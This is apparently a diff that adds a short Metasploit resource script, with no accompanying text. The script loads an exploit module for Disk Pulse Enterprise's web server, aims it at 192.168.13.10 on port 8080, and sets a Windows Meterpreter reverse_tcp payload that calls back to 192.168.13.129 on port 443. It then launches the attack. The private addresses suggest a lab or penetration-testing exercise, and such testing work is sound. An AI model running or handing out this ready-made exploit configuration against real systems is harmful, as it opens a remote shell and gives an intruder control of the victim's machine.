@@ -1,0 +1,7 @@
+use exploit/windows/http/disk_pulse_enterprise_get 
+set rhosts 192.168.13.10
+set rport 8080
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.13.129
+set lport 443
+exploit -z
